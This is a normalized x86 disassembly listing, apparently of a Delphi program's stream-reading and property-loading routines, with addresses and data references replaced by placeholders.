mov [ esp ] eax
mov eax edx
call sub_403e3c
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_415e54
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x84 ]
test eax eax
je r-xdata
mov eax ebp
call sub_403ef0
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_415ecc
mov edi eax
mov edx [ esp + 0x4 ]
call sub_415dcc
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403e58
test al al
jne r-xdata
sub_41ab18
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41ab64
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41ab64
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
sub_41abb4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41ac04
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41c48c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
dec eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0x4 ]
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac0b
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
call sub_41a528
sub_41ac14
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41ac60
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41c548
mov eax [ ebp - 0x4 ]
call sub_4057dc
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac67
lea eax [ ebp - 0x4 ]
call sub_40566c
retn
call sub_41a528
sub_41ac70
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41ad10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a6fc
test al al
jne r-xdata
mov eax ebx
call sub_41a6fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417470
jmp r-xdata
mov eax ebx
call sub_41aaf4
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41b7b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad17
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_4173a4
mov esi eax
mov eax ebx
call sub_41b7b0
jmp r-xdata
mov eax ebx
call sub_41b700
mov eax ebx
call sub_41a6fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41b91c
mov eax ebx
call sub_41b7b8
sub_41ad40
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_406248
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_416668
inc esi
dec ebx
jne r-xdata
sub_41ad7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41e09c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_406248
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov edx ebx
mov eax edi
call sub_41e070
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_406248
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41e070
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41adf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_406248
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41ae5c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41ae7c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402dac
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41ae5c
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41c934
call sub_402dac
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403f64
sub_41aedc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41afc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41cad4
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x72 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x74 ]
call [ esi + 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41af96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41afc7
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41ae7c
pop ecx
test al al
jne r-xdata
call sub_404854
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_404800
sub_41afec
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41b064
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_404160
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_41630c
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41b069
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41ae7c
pop ecx
test al al
jne r-xdata
call sub_404854
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_404800
sub_41b08c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41b107
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41cad4
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_404160
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41b10c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41ae7c
pop ecx
test al al
jne r-xdata
call sub_404854
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_404800
sub_41b130
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b354
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41c450
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41c450
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41b324
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41b2e2
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41ad7c
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_41adf4
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41aedc
pop ecx
push ebp
call sub_41b08c
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41afec
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_404884
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_41adf4
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
movzx eax [ r-xdata ]
call sub_41adf4
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b35b
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_404160
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_416824
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41ad40
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_416668
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41ad40
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_416668
sub_41b2e7
push ebp
call sub_41ae5c
pop ecx
test al al
je r-xdata
call sub_404800
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403f64
sub_41b370
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b3e0
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41b3cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b3e0
mov eax [ ebp - 0x4 ]
call sub_41a8a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41aa08
retn
sub_41b3e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a6fc
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b91c
mov eax [ ebp - 0x4 ]
call sub_41b7b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_404160
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41b4a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_404160
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a6fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41b130
mov eax [ ebp - 0x4 ]
call sub_41b7b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4a9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41b4b0
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41c62c
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41b4e8
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41ab18
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41b4e8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41c62c
cmp al 0x15
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41b76c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41ab18
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41b52c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41c62c
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41b76c
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41ab18
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41b570
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41c62c
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41b76c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41ab18
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41b5c0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41c62c
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41b76c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41ab18
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41b604
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41c62c
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41a528
movzx eax [ eax + lookup_table_41b62c ]
jmp [ eax * 4 + jump_table_41b63a ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41ab18
movzx ecx [ esp ]
mov eax esi
xor edx edx
call sub_404f34
mov eax esi
call j_sub_405330
mov edx eax
movzx ecx [ esp ]
mov eax ebx
call sub_41ab18
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404e98
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404e98
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404e98
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404e98
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41b700
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41c62c
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41ab18
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41ab18
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41ab18
jmp r-xdata
jmp r-xdata
call sub_41a528
sub_41b76c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41aaf4
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41b700
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41c62c
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41ab18
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41b7c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41aaf4
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41c62c
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41b700
mov [ edi ] eax
sub_41b7fd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b8f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404e44
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404edc
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b8f8
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403e44
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4050a8
sub_41b91c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41bb10
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_41bac2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41c450
xor edx edx
push ebp
push sub_41ba9b
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
sub eax 0x4
mov eax [ eax ]
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x80
push eax
mov ecx ebx
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_405384
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4041a4
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x80 ]
call sub_4131e4
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4041a4
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x80 ]
call sub_4131e4
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41bcc4
jmp r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_41ab04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_41ab04
mov eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4132a8
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41b900
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb17
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov [ ebp - 0x10 ] ebx
jmp r-xdata
sub_41bac7
add [ eax ] eax
add [ eax ] al
les eax [ edx - 0x452cffc0 ]
inc ecx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x88 ] 0x0
je r-xdata
call sub_404800
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_404854
xor eax eax
